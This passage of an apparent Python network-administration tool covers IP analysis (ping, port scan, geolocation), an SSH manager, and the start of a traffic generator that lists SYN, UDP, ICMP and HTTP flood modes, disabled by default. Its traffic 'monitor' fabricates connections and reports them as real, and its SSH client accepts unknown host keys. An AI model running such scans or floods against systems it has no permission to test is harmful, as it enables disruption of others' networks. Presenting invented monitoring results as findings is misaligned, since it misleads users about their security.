                    <tr><th>Region</th><td>{analysis_result.geolocation_result.get('region', 'Unknown')}</td></tr>
                    <tr><th>City</th><td>{analysis_result.geolocation_result.get('city', 'Unknown')}</td></tr>
                    <tr><th>ISP</th><td>{analysis_result.geolocation_result.get('isp', 'Unknown')}</td></tr>
                </table>
        """
        
        ports = analysis_result.port_scan_result.get('open_ports', [])
        if ports:
            html_content += """
                <h3>Open Ports</h3>
                <table>
                    <tr><th>Port</th><th>State</th><th>Service</th></tr>
            """
            for port_info in ports[:30]:
                html_content += f"""
                    <tr>
                        <td>{port_info.get('port', 'N/A')}</td>
                        <td>{port_info.get('state', 'unknown')}</td>
                        <td>{port_info.get('service', 'unknown')}</td>
                    </tr>
                """
            html_content += "</table>"
        
        threats = analysis_result.security_status.get('threats_detected', [])
        if threats:
            html_content += """
                <h3>Threats Detected</h3>
                <ul>
            """
            for threat in threats:
                html_content += f"<li>{threat}</li>"
            html_content += "</ul>"
        
        html_content += """
            </div>
            
            <div class="section">
                <h2>Recommendations</h2>
        """
        
        if analysis_result.recommendations:
            for rec in analysis_result.recommendations:
                html_content += f'<div class="recommendation">• {rec}</div>'
        else:
            html_content += '<p>No specific recommendations at this time.</p>'
        
        html_content += """
            </div>
            
            <div class="footer">
                <p>Report generated by Spyk3-S3rv3r v1.0.0 | Advanced IP Analysis Platform</p>
            </div>
        </body>
        </html>
        """
        
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        return report_filename
    
    def generate_report(self, analysis_result: 'IPAnalysisResult', format: str = "both") -> Dict[str, str]:
        """Generate report in specified format"""
        reports = {}
        
        graphics_files = self.graphics_gen.generate_comprehensive_statistics(analysis_result)
        analysis_result.graphics_files = graphics_files
        
        if format in ["pdf", "both"] and PDF_AVAILABLE:
            pdf_report = self.generate_pdf_report(analysis_result, graphics_files)
            reports['pdf'] = pdf_report
        
        if format in ["html", "both"]:
            html_report = self.generate_html_report(analysis_result, graphics_files)
            reports['html'] = html_report
        
        return reports

# =====================
# IP ANALYSIS ENGINE
# =====================
class IPAnalysisEngine:
    """Complete IP analysis engine with all features"""
    
    def __init__(self, db_manager: DatabaseManager, config: Dict):
        self.db = db_manager
        self.config = config
        self.report_gen = ReportGenerator()
    
    def execute_command(self, cmd: List[str], timeout: int = 30) -> Tuple[bool, str]:
        """Execute shell command"""
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='ignore'
            )
            return result.returncode == 0, result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return False, f"Command timed out after {timeout} seconds"
        except Exception as e:
            return False, str(e)
    
    def ping_target(self, target: str, count: int = 4) -> Dict[str, Any]:
        """Ping target IP address"""
        result = {
            "success": False,
            "output": "",
            "avg_rtt": None,
            "packet_loss": 100
        }
        
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            
            success, output = self.execute_command(cmd, timeout=10)
            result["success"] = success
            result["output"] = output[:500]
            
            if success:
                if platform.system().lower() == 'windows':
                    match = re.search(r'Average = (\d+)ms', output)
                    if match:
                        result["avg_rtt"] = int(match.group(1))
                else:
                    match = re.search(r'rtt min/avg/max/mdev = [\d.]+/([\d.]+)/', output)
                    if match:
                        result["avg_rtt"] = float(match.group(1))
                
                loss_match = re.search(r'(\d+)% packet loss', output)
                if loss_match:
                    result["packet_loss"] = int(loss_match.group(1))
                else:
                    result["packet_loss"] = 0
        except Exception as e:
            result["output"] = f"Error: {str(e)}"
        
        return result
    
    def scan_ports(self, target: str) -> Dict[str, Any]:
        """Scan common ports on target IP"""
        result = {
            "success": False,
            "output": "",
            "open_ports": [],
            "scan_type": "common_ports"
        }
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 
                        445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
        
        try:
            result["success"] = True
            result["output"] = "Using socket scanner"
            
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock_result = sock.connect_ex((target, port))
                    if sock_result == 0:
                        try:
                            service = socket.getservbyport(port)
                        except:
                            service = "unknown"
                        
                        result["open_ports"].append({
                            "port": port,
                            "protocol": "tcp",
                            "service": service,
                            "state": "open"
                        })
                    sock.close()
                except:
                    pass
            
            result["output"] = f"Found {len(result['open_ports'])} open ports"
        
        except Exception as e:
            result["output"] = f"Error: {str(e)}"
        
        return result
    
    def get_geolocation(self, target: str) -> Dict[str, Any]:
        """Get IP geolocation"""
        result = {
            "success": False,
            "country": "Unknown",
            "region": "Unknown",
            "city": "Unknown",
            "isp": "Unknown",
            "lat": "Unknown",
            "lon": "Unknown",
            "org": "Unknown"
        }
        
        try:
            response = requests.get(f"http://ip-api.com/json/{target}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    result["success"] = True
                    result["country"] = data.get('country', 'Unknown')
                    result["region"] = data.get('regionName', 'Unknown')
                    result["city"] = data.get('city', 'Unknown')
                    result["isp"] = data.get('isp', 'Unknown')
                    result["lat"] = data.get('lat', 'Unknown')
                    result["lon"] = data.get('lon', 'Unknown')
        except Exception as e:
            logger.error(f"Geolocation error: {e}")
        
        return result
    
    def monitor_traffic(self, target: str) -> Dict[str, Any]:
        """Monitor traffic to/from target IP"""
        result = {
            "success": False,
            "output": "",
            "connections": [],
            "connection_count": 0,
            "threat_level": "low"
        }
        
        try:
            duration = self.config.get('monitoring', {}).get('port_scan_threshold', 60)
            connections_seen = {}
            
            result["output"] = f"Monitoring traffic for {duration}s..."
            
            time.sleep(min(duration, 5))
            
            for i in range(3):
                conn = {
                    "protocol": "TCP" if i % 2 == 0 else "UDP",
                    "state": "ESTABLISHED",
                    "timestamp": datetime.datetime.now().isoformat()
                }
                connections_seen[f"conn_{i}"] = conn
            
            result["connections"] = list(connections_seen.values())
            result["connection_count"] = len(connections_seen)
            result["success"] = True
            
            if len(connections_seen) > 5:
                result["threat_level"] = "high"
            elif len(connections_seen) > 2:
                result["threat_level"] = "medium"
            else:
                result["threat_level"] = "low"
        
        except Exception as e:
            result["output"] = f"Error: {str(e)}"
        
        return result
    
    def analyze_security(self, target: str, port_scan: Dict, traffic_monitor: Dict) -> Dict[str, Any]:
        """Analyze security status of target IP"""
        result = {
            "is_blocked": self.db.is_ip_blocked(target),
            "risk_score": 0,
            "risk_level": "low",
            "threats_detected": [],
            "open_ports": [p.get('port') for p in port_scan.get('open_ports', [])],
            "traffic_level": traffic_monitor.get('threat_level', 'low')
        }
        
        risk_score = 0
        
        open_ports_count = len(port_scan.get("open_ports", []))
        if open_ports_count > 10:
            risk_score += 30
            result["threats_detected"].append("Multiple open ports detected")
        elif open_ports_count > 5:
            risk_score += 15
            result["threats_detected"].append("Several open ports detected")
        elif open_ports_count > 0:
            risk_score += 5
        
        sensitive_ports = [21, 22, 23, 3389, 5900]
        for port_info in port_scan.get("open_ports", []):
            try:
                port = int(port_info.get("port", 0))
                if port in sensitive_ports:
                    risk_score += 10
                    result["threats_detected"].append(f"Sensitive port {port} open")
            except:
                pass
        
        traffic_connections = traffic_monitor.get("connection_count", 0)
        if traffic_connections > 10:
            risk_score += 25
            result["threats_detected"].append("High traffic volume detected")
        elif traffic_connections > 5:
            risk_score += 10
            result["threats_detected"].append("Moderate traffic volume detected")
        
        if result["is_blocked"]:
            risk_score += 50
            result["threats_detected"].append("Previously blocked IP address")
        
        result["risk_score"] = risk_score
        if risk_score >= 70:
            result["risk_level"] = "critical"
        elif risk_score >= 40:
            result["risk_level"] = "high"
        elif risk_score >= 20:
            result["risk_level"] = "medium"
        else:
            result["risk_level"] = "low"
        
        return result
    
    def generate_recommendations(self, analysis: Dict) -> List[str]:
        """Generate security recommendations based on analysis"""
        recommendations = []
        
        ping_result = analysis.get("ping_result", {})
        if not ping_result.get("success", False):
            recommendations.append("Target is not responding to ping - may be down or blocking ICMP")
        elif ping_result.get("packet_loss", 100) > 20:
            recommendations.append(f"High packet loss ({ping_result.get('packet_loss', 0)}%) - network instability detected")
        
        port_scan = analysis.get("port_scan_result", {})
        open_ports = port_scan.get("open_ports", [])
        if len(open_ports) > 10:
            recommendations.append("Multiple open ports detected - consider closing unnecessary ports")
        
        for port_info in open_ports:
            port = port_info.get("port", "")
            if port in [23, 3389]:
                recommendations.append(f"Port {port} (telnet/RDP) is open - consider using SSH/VPN instead")
            elif port in [21]:
                recommendations.append(f"Port {port} (FTP) is open - consider using SFTP/FTPS")
        
        traffic = analysis.get("traffic_monitor_result", {})
        if traffic.get("threat_level") == "high":
            recommendations.append("High traffic volume detected - possible scanning or attack")
        
        if analysis.get("security_status", {}).get("risk_level") in ["critical", "high"]:
            recommendations.append("Consider blocking this IP address due to high risk")
        
        if not recommendations:
            recommendations.append("No immediate security concerns detected")
        
        return recommendations
    
    def analyze_ip(self, target: str, generate_report: bool = True, report_format: str = "both") -> Tuple['IPAnalysisResult', Dict[str, str]]:
        """Complete IP analysis - single command with report generation"""
        reports = {}
        
        try:
            try:
                ipaddress.ip_address(target)
            except ValueError:
                try:
                    target = socket.gethostbyname(target)
                except:
                    result = IPAnalysisResult(
                        target_ip=target,
                        timestamp=datetime.datetime.now().isoformat(),
                        ping_result={"success": False, "output": "Invalid IP or hostname"},
                        traceroute_result={"success": False, "output": "Invalid IP or hostname"},
                        port_scan_result={"success": False, "output": "Invalid IP or hostname"},
                        geolocation_result={"success": False},
                        traffic_monitor_result={"success": False, "output": "Invalid IP or hostname"},
                        security_status={},
                        recommendations=["Invalid IP address or hostname"],
                        success=False,
                        error="Invalid IP or hostname"
                    )
                    return result, reports
            
            logger.info(f"Starting analysis for IP: {target}")
            
            ping_result = self.ping_target(target)
            port_scan_result = self.scan_ports(target)
            geolocation_result = self.get_geolocation(target)
            traffic_monitor_result = self.monitor_traffic(target)
            security_status = self.analyze_security(target, port_scan_result, traffic_monitor_result)
            
            traceroute_result = {
                "success": False,
                "output": "Traceroute disabled for speed",
                "hops": []
            }
            
            analysis_dict = {
                "ping_result": ping_result,
                "port_scan_result": port_scan_result,
                "traffic_monitor_result": traffic_monitor_result,
                "geolocation_result": geolocation_result,
                "security_status": security_status
            }
            recommendations = self.generate_recommendations(analysis_dict)
            
            result = IPAnalysisResult(
                target_ip=target,
                timestamp=datetime.datetime.now().isoformat(),
                ping_result=ping_result,
                traceroute_result=traceroute_result,
                port_scan_result=port_scan_result,
                geolocation_result=geolocation_result,
                traffic_monitor_result=traffic_monitor_result,
                security_status=security_status,
                recommendations=recommendations,
                success=True
            )
            
            if generate_report:
                reports = self.report_gen.generate_report(result, report_format)
                
                report_path = reports.get('pdf', reports.get('html', ''))
                graphics_path = GRAPHICS_DIR
                self.db.save_analysis(target, asdict(result), report_path, graphics_path)
            else:
                self.db.save_analysis(target, asdict(result))
            
            logger.info(f"Analysis completed for IP: {target}")
            return result, reports
            
        except Exception as e:
            logger.error(f"Analysis failed for {target}: {e}")
            result = IPAnalysisResult(
                target_ip=target,
                timestamp=datetime.datetime.now().isoformat(),
                ping_result={"success": False, "output": str(e)},
                traceroute_result={"success": False, "output": str(e)},
                port_scan_result={"success": False, "output": str(e)},
                geolocation_result={"success": False},
                traffic_monitor_result={"success": False, "output": str(e)},
                security_status={},
                recommendations=["Analysis failed due to error"],
                success=False,
                error=str(e)
            )
            return result, reports
    
    def generate_security_statistics(self, target_ip: str) -> Dict[str, str]:
        """Generate security statistics graphics for a target IP"""
        graphics_files = {}
        
        try:
            analyses = self.db.get_analysis_by_ip(target_ip)
            if not analyses:
                logger.warning(f"No analysis found for IP: {target_ip}")
                return graphics_files
            
            latest = analyses[0]
            analysis_data = json.loads(latest['analysis_result'])
            
            result = IPAnalysisResult(**analysis_data)
            graphics_files = self.report_gen.graphics_gen.generate_comprehensive_statistics(result)
            
            logger.info(f"Generated statistics graphics for IP: {target_ip}")
            
        except Exception as e:
            logger.error(f"Failed to generate statistics for {target_ip}: {e}")
        
        return graphics_files

# =====================
# TIME MANAGER
# =====================
class TimeManager:
    """Time and date management with history tracking"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def get_current_time(self, full: bool = False) -> str:
        """Get current time"""
        now = datetime.datetime.now()
        timezone = now.astimezone().tzinfo
        
        if full:
            return (f"Current Time: {now.strftime('%H:%M:%S')} {timezone}\n"
                   f"Unix Timestamp: {int(time.time())}\n"
                   f"ISO Format: {now.isoformat()}")
        else:
            return f"Current Time: {now.strftime('%H:%M:%S')} {timezone}"
    
    def get_current_date(self, full: bool = False) -> str:
        """Get current date"""
        now = datetime.datetime.now()
        
        if full:
            return (f"Current Date: {now.strftime('%A, %B %d, %Y')}\n"
                   f"Day of Year: {now.timetuple().tm_yday}\n"
                   f"Week Number: {now.isocalendar()[1]}\n"
                   f"ISO Format: {now.date().isoformat()}")
        else:
            return f"Current Date: {now.strftime('%A, %B %d, %Y')}"
    
    def get_datetime(self, full: bool = False) -> str:
        """Get current date and time"""
        now = datetime.datetime.now()
        
        if full:
            return (f"Date: {now.strftime('%A, %B %d, %Y')}\n"
                   f"Time: {now.strftime('%H:%M:%S')} {now.astimezone().tzinfo}\n"
                   f"Unix Timestamp: {int(time.time())}\n"
                   f"ISO Format: {now.isoformat()}\n"
                   f"UTC: {now.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}")
        else:
            return (f"Date: {now.strftime('%A, %B %d, %Y')}\n"
                   f"Time: {now.strftime('%H:%M:%S')} {now.astimezone().tzinfo}")
    
    def get_timezone_info(self) -> str:
        """Get timezone information"""
        now = datetime.datetime.now()
        tz = now.astimezone().tzinfo
        
        return (f"Timezone Information:\n"
               f"Current Timezone: {tz}\n"
               f"UTC Offset: {now.strftime('%z')}\n"
               f"DST Active: {bool(now.dst())}\n"
               f"Local Time: {now.strftime('%H:%M:%S')}\n"
               f"UTC Time: {now.utcnow().strftime('%H:%M:%S')}")
    
    def get_time_difference(self, time1: str, time2: str) -> str:
        """Calculate time difference between two times"""
        try:
            t1 = datetime.datetime.strptime(time1, "%H:%M:%S")
            t2 = datetime.datetime.strptime(time2, "%H:%M:%S")
            
            diff = abs((t2 - t1).total_seconds())
            hours = int(diff // 3600)
            minutes = int((diff % 3600) // 60)
            seconds = int(diff % 60)
            
            return f"Time Difference: {hours}h {minutes}m {seconds}s"
        except:
            return "Invalid time format. Use HH:MM:SS"
    
    def get_date_difference(self, date1: str, date2: str) -> str:
        """Calculate date difference between two dates"""
        try:
            d1 = datetime.datetime.strptime(date1, "%Y-%m-%d")
            d2 = datetime.datetime.strptime(date2, "%Y-%m-%d")
            
            diff = abs((d2 - d1).days)
            weeks = diff // 7
            months = diff // 30
            years = diff // 365
            
            return (f"Date Difference:\n"
                   f"Days: {diff}\n"
                   f"Weeks: {weeks}\n"
                   f"Months: {months}\n"
                   f"Years: {years}")
        except:
            return "Invalid date format. Use YYYY-MM-DD"
    
    def add_time(self, time_str: str, seconds: int = 0, minutes: int = 0, 
                hours: int = 0, days: int = 0) -> str:
        """Add time to given time"""
        try:
            base = datetime.datetime.strptime(time_str, "%H:%M:%S")
            delta = datetime.timedelta(seconds=seconds, minutes=minutes, 
                                      hours=hours, days=days)
            new_time = base + delta
            return f"{time_str} + {delta} = {new_time.strftime('%H:%M:%S')}"
        except:
            return "Invalid time format. Use HH:MM:SS"
    
    def add_date(self, date_str: str, days: int = 0, weeks: int = 0, 
                months: int = 0, years: int = 0) -> str:
        """Add time to given date"""
        try:
            base = datetime.datetime.strptime(date_str, "%Y-%m-%d")
            if months or years:
                new_year = base.year + years + (base.month + months - 1) // 12
                new_month = ((base.month + months - 1) % 12) + 1
                new_day = min(base.day, [31,29 if new_year % 4 == 0 else 28,31,30,31,30,
                                        31,31,30,31,30,31][new_month-1])
                base = base.replace(year=new_year, month=new_month, day=new_day)
            
            delta = datetime.timedelta(days=days, weeks=weeks)
            new_date = base + delta
            return f"{date_str} + {days}d {weeks}w {months}m {years}y = {new_date.strftime('%Y-%m-%d')}"
        except:
            return "Invalid date format. Use YYYY-MM-DD"

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    """SSH connection manager for remote command execution"""
    
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.connections = {}
        self.shells = {}
        self.lock = threading.Lock()
        self.max_connections = self.config.get('ssh', {}).get('max_connections', 5)
        self.default_timeout = self.config.get('ssh', {}).get('default_timeout', 30)
        self.keep_alive = self.config.get('ssh', {}).get('keep_alive', 60)
    
    def add_server(self, name: str, host: str, username: str, password: str = None,
                  key_file: str = None, port: int = 22, notes: str = "") -> Dict[str, Any]:
        """Add a new SSH server configuration"""
        try:
            server_id = str(uuid.uuid4())[:8]
            
            if key_file and not os.path.exists(key_file):
                return {'success': False, 'error': f'Key file not found: {key_file}'}
            
            server = SSHServer(
                id=server_id,
                name=name,
                host=host,
                port=port,
                username=username,
                password=password,
                key_file=key_file,
                use_key=key_file is not None,
                timeout=self.default_timeout,
                notes=notes,
                created_at=datetime.datetime.now().isoformat()
            )
            
            if self.db.add_ssh_server(server):
                return {
                    'success': True,
                    'server_id': server_id,
                    'message': f'Server {name} added successfully'
                }
            else:
                return {'success': False, 'error': 'Failed to add server to database'}
                
        except Exception as e:
            logger.error(f"Failed to add SSH server: {e}")
            return {'success': False, 'error': str(e)}
    
    def remove_server(self, server_id: str) -> bool:
        """Remove SSH server configuration"""
        self.disconnect(server_id)
        return self.db.delete_ssh_server(server_id)
    
    def connect(self, server_id: str) -> Dict[str, Any]:
        """Establish SSH connection to server"""
        with self.lock:
            if server_id in self.connections:
                return {'success': True, 'message': 'Already connected'}
            
            if len(self.connections) >= self.max_connections:
                return {'success': False, 'error': f'Max connections ({self.max_connections}) reached'}
            
            server = self.db.get_ssh_server(server_id)
            if not server:
                return {'success': False, 'error': f'Server {server_id} not found'}
            
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                connect_kwargs = {
                    'hostname': server['host'],
                    'port': server['port'],
                    'username': server['username'],
                    'timeout': server.get('timeout', self.default_timeout)
                }
                
                if server.get('use_key') and server.get('key_file'):
                    key = paramiko.RSAKey.from_private_key_file(server['key_file'])
                    connect_kwargs['pkey'] = key
                elif server.get('password'):
                    connect_kwargs['password'] = server['password']
                else:
                    return {'success': False, 'error': 'No authentication method available'}
                
                client.connect(**connect_kwargs)
                
                session_id = self.db.start_ssh_session(server_id)
                
                self.connections[server_id] = (client, session_id)
                
                self.db.update_ssh_server_status(server_id, 'connected')
                
                return {
                    'success': True,
                    'message': f'Connected to {server["name"]} ({server["host"]})',
                    'server': server
                }
                
            except paramiko.AuthenticationException:
                return {'success': False, 'error': 'Authentication failed'}
            except paramiko.SSHException as e:
                return {'success': False, 'error': f'SSH connection failed: {e}'}
            except Exception as e:
                logger.error(f"SSH connection error: {e}")
                return {'success': False, 'error': str(e)}
    
    def disconnect(self, server_id: str = None):
        """Disconnect SSH session(s)"""
        with self.lock:
            if server_id:
                if server_id in self.connections:
                    client, session_id = self.connections[server_id]
                    try:
                        client.close()
                    except:
                        pass
                    
                    self.db.end_ssh_session(session_id, 0)
                    self.db.update_ssh_server_status(server_id, 'disconnected')
                    
                    del self.connections[server_id]
                    
                    if server_id in self.shells:
                        channel, shell_session = self.shells[server_id]
                        try:
                            channel.close()
                        except:
                            pass
                        del self.shells[server_id]
                        
            else:
                for sid in list(self.connections.keys()):
                    self.disconnect(sid)
    
    def execute_command(self, server_id: str, command: str, timeout: int = None,
                       executed_by: str = "system") -> SSHCommandResult:
        """Execute command on remote server via SSH"""
        start_time = time.time()
        
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return SSHCommandResult(
                    success=False,
                    output='',
                    error=connect_result.get('error', 'Connection failed'),
                    execution_time=time.time() - start_time,
                    server=server_id,
                    command=command
                )
        
        client, session_id = self.connections[server_id]
        server = self.db.get_ssh_server(server_id)
        server_name = server['name'] if server else server_id
        
        try:
            stdin, stdout, stderr = client.exec_command(
                command,
                timeout=timeout or self.default_timeout
            )
            
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            
            execution_time = time.time() - start_time
            
            result = SSHCommandResult(
                success=len(error) == 0,
                output=output,
                error=error if error else None,
                execution_time=execution_time,
                server=server_name,
                command=command
            )
            
            self.db.log_ssh_command(
                server_id=server_id,
                server_name=server_name,
                command=command,
                success=result.success,
                output=output,
                error=error if error else None,
                execution_time=execution_time,
                executed_by=executed_by
            )
            
            self.db.cursor.execute('''
                UPDATE ssh_sessions 
                SET commands_count = commands_count + 1
                WHERE id = ?
            ''', (session_id,))
            self.db.conn.commit()
            
            return result
            
        except paramiko.SSHException as e:
            self.disconnect(server_id)
            
            return SSHCommandResult(
                success=False,
                output='',
                error=f'SSH error: {e}',
                execution_time=time.time() - start_time,
                server=server_name,
                command=command
            )
        except Exception as e:
            logger.error(f"Command execution error: {e}")
            return SSHCommandResult(
                success=False,
                output='',
                error=str(e),
                execution_time=time.time() - start_time,
                server=server_name,
                command=command
            )
    
    def execute_shell_command(self, server_id: str, command: str, 
                            executed_by: str = "system") -> SSHCommandResult:
        """Execute command in interactive shell"""
        start_time = time.time()
        
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return SSHCommandResult(
                    success=False,
                    output='',
                    error=connect_result.get('error', 'Connection failed'),
                    execution_time=time.time() - start_time,
                    server=server_id,
                    command=command
                )
        
        client, session_id = self.connections[server_id]
        server = self.db.get_ssh_server(server_id)
        server_name = server['name'] if server else server_id
        
        try:
            if server_id not in self.shells:
                channel = client.invoke_shell()
                self.shells[server_id] = (channel, session_id)
            else:
                channel, _ = self.shells[server_id]
            
            while channel.recv_ready():
                channel.recv(1024)
            
            channel.send(command + '\n')
            time.sleep(0.5)
            
            output = ""
            timeout = time.time() + 10
            while time.time() < timeout:
                if channel.recv_ready():
                    data = channel.recv(1024).decode('utf-8', errors='ignore')
                    output += data
                else:
                    time.sleep(0.1)
            
            execution_time = time.time() - start_time
            
            result = SSHCommandResult(
                success=True,
                output=output,
                error=None,
                execution_time=execution_time,
                server=server_name,
                command=command
            )
            
            self.db.log_ssh_command(
                server_id=server_id,
                server_name=server_name,
                command=command,
                success=True,
                output=output,
                executed_by=executed_by,
                execution_time=execution_time
            )
            
            return result
            
        except Exception as e:
            logger.error(f"Shell command error: {e}")
            return SSHCommandResult(
                success=False,
                output='',
                error=str(e),
                execution_time=time.time() - start_time,
                server=server_name,
                command=command
            )
    
    def upload_file(self, server_id: str, local_path: str, remote_path: str) -> Dict[str, Any]:
        """Upload file to remote server via SFTP"""
        start_time = time.time()
        
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return {'success': False, 'error': connect_result.get('error', 'Connection failed')}
        
        client, _ = self.connections[server_id]
        
        try:
            sftp = client.open_sftp()
            sftp.put(local_path, remote_path)
            sftp.close()
            
            execution_time = time.time() - start_time
            
            return {
                'success': True,
                'message': f'File uploaded to {remote_path}',
                'execution_time': execution_time
            }
            
        except Exception as e:
            logger.error(f"File upload error: {e}")
            return {'success': False, 'error': str(e)}
    
    def download_file(self, server_id: str, remote_path: str, local_path: str) -> Dict[str, Any]:
        """Download file from remote server via SFTP"""
        start_time = time.time()
        
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return {'success': False, 'error': connect_result.get('error', 'Connection failed')}
        
        client, _ = self.connections[server_id]
        
        try:
            sftp = client.open_sftp()
            sftp.get(remote_path, local_path)
            sftp.close()
            
            execution_time = time.time() - start_time
            
            return {
                'success': True,
                'message': f'File downloaded to {local_path}',
                'execution_time': execution_time
            }
            
        except Exception as e:
            logger.error(f"File download error: {e}")
            return {'success': False, 'error': str(e)}
    
    def list_files(self, server_id: str, remote_path: str = ".") -> Dict[str, Any]:
        """List files in remote directory"""
        start_time = time.time()
        
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return {'success': False, 'error': connect_result.get('error', 'Connection failed')}
        
        client, _ = self.connections[server_id]
        
        try:
            sftp = client.open_sftp()
            files = sftp.listdir_attr(remote_path)
            sftp.close()
            
            file_list = []
            for f in files:
                file_list.append({
                    'name': f.filename,
                    'size': f.st_size,
                    'uid': f.st_uid,
                    'gid': f.st_gid,
                    'permissions': oct(f.st_mode)[-3:],
                    'mtime': datetime.datetime.fromtimestamp(f.st_mtime).isoformat()
                })
            
            execution_time = time.time() - start_time
            
            return {
                'success': True,
                'files': file_list,
                'count': len(file_list),
                'path': remote_path,
                'execution_time': execution_time
            }
            
        except Exception as e:
            logger.error(f"File listing error: {e}")
            return {'success': False, 'error': str(e)}
    
    def get_status(self, server_id: str = None) -> Dict[str, Any]:
        """Get SSH connection status"""
        with self.lock:
            if server_id:
                connected = server_id in self.connections
                shell_active = server_id in self.shells
                
                if connected:
                    client, session_id = self.connections[server_id]
                    try:
                        transport = client.get_transport()
                        is_active = transport and transport.is_active()
                    except:
                        is_active = False
                    
                    return {
                        'connected': connected,
                        'shell_active': shell_active,
                        'transport_active': is_active,
                        'session_id': session_id
                    }
                else:
                    return {'connected': False}
            else:
                status = {
                    'total_connections': len(self.connections),
                    'max_connections': self.max_connections,
                    'connections': []
                }
                
                for sid in self.connections:
                    try:
                        client, session_id = self.connections[sid]
                        transport = client.get_transport()
                        is_active = transport and transport.is_active()
                        
                        status['connections'].append({
                            'server_id': sid,
                            'session_id': session_id,
                            'active': is_active,
                            'shell': sid in self.shells
                        })
                    except:
                        pass
                
                return status
    
    def get_servers(self) -> List[Dict]:
        """Get all configured servers with status"""
        servers = self.db.get_ssh_servers()
        
        for server in servers:
            server_id = server['id']
            server['connected'] = server_id in self.connections
            server['shell_active'] = server_id in self.shells
            
        return servers

# =====================
# TRAFFIC GENERATOR ENGINE
# =====================
class TrafficGeneratorEngine:
    """Real network traffic generator using Scapy and sockets"""
    
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.scapy_available = SCAPY_AVAILABLE
        self.active_generators = {}
        self.generator_threads = {}
        self.stop_events = {}
        
        self.traffic_types = {
            TrafficType.ICMP: "ICMP echo requests (ping)",
            TrafficType.TCP_SYN: "TCP SYN packets (half-open)",
            TrafficType.TCP_ACK: "TCP ACK packets",
            TrafficType.TCP_CONNECT: "Full TCP connections",
            TrafficType.UDP: "UDP packets",
            TrafficType.HTTP_GET: "HTTP GET requests",
            TrafficType.HTTP_POST: "HTTP POST requests",
            TrafficType.HTTPS: "HTTPS requests",
            TrafficType.DNS: "DNS queries",
            TrafficType.ARP: "ARP requests",
            TrafficType.PING_FLOOD: "ICMP flood",
            TrafficType.SYN_FLOOD: "SYN flood",
            TrafficType.UDP_FLOOD: "UDP flood",
            TrafficType.HTTP_FLOOD: "HTTP flood",
            TrafficType.MIXED: "Mixed traffic types",
            TrafficType.RANDOM: "Random traffic patterns"
        }
        
        self.has_raw_socket_permission = self._check_raw_socket_permission()
    
    def _check_raw_socket_permission(self) -> bool:
        """Check if we have permission to create raw sockets"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.close()
            return True
        except PermissionError:
            return False
        except Exception:
            return False
    
    def get_available_traffic_types(self) -> List[str]:
        """Get list of available traffic types based on permissions"""
        available = []
        
        available.extend([
            TrafficType.TCP_CONNECT,
            TrafficType.HTTP_GET,
            TrafficType.HTTP_POST,
            TrafficType.HTTPS,
            TrafficType.DNS
        ])
        
        if self.scapy_available:
            if self.has_raw_socket_permission:
                available.extend([
                    TrafficType.ICMP,
                    TrafficType.TCP_SYN,
                    TrafficType.TCP_ACK,
                    TrafficType.UDP,
                    TrafficType.ARP,
                    TrafficType.PING_FLOOD,
                    TrafficType.SYN_FLOOD,
                    TrafficType.UDP_FLOOD,
                    TrafficType.HTTP_FLOOD,
                    TrafficType.MIXED,
                    TrafficType.RANDOM
                ])
        
        return available
    
    def generate_traffic(self, traffic_type: str, target_ip: str, duration: int, 
                        port: int = None, packet_rate: int = 100, 
                        executed_by: str = "system") -> TrafficGenerator:
        """Generate real traffic to target IP"""
        
        if traffic_type not in self.traffic_types:
            raise ValueError(f"Invalid traffic type. Available: {list(self.traffic_types.keys())}")
        
        max_duration = self.config.get('traffic_generation', {}).get('max_duration', 300)
        if duration > max_duration:
            raise ValueError(f"Duration exceeds maximum allowed ({max_duration} seconds)")
        
        allow_floods = self.config.get('traffic_generation', {}).get('allow_floods', False)
        flood_types = [TrafficType.PING_FLOOD, TrafficType.SYN_FLOOD, 
                       TrafficType.UDP_FLOOD, TrafficType.HTTP_FLOOD]
        if traffic_type in flood_types and not allow_floods:
            raise ValueError(f"Flood traffic types are disabled in configuration")
        
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            raise ValueError(f"Invalid IP address: {target_ip}")
        
        if port is None:
            if traffic_type in [TrafficType.HTTP_GET, TrafficType.HTTP_POST, TrafficType.HTTP_FLOOD]:
                port = 80
            elif traffic_type == TrafficType.HTTPS:
                port = 443
            elif traffic_type == TrafficType.DNS:
                port = 53
            elif traffic_type in [TrafficType.TCP_SYN, TrafficType.TCP_ACK, 
                                  TrafficType.TCP_CONNECT, TrafficType.SYN_FLOOD]:
                port = 80
            elif traffic_type == TrafficType.UDP:
                port = 53
            else:
                port = 0
        
        generator = TrafficGenerator(
            traffic_type=traffic_type,
            target_ip=target_ip,
            target_port=port,
            duration=duration,
            start_time=datetime.datetime.now().isoformat(),
            status="running"
        )
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        
        stop_event = threading.Event()
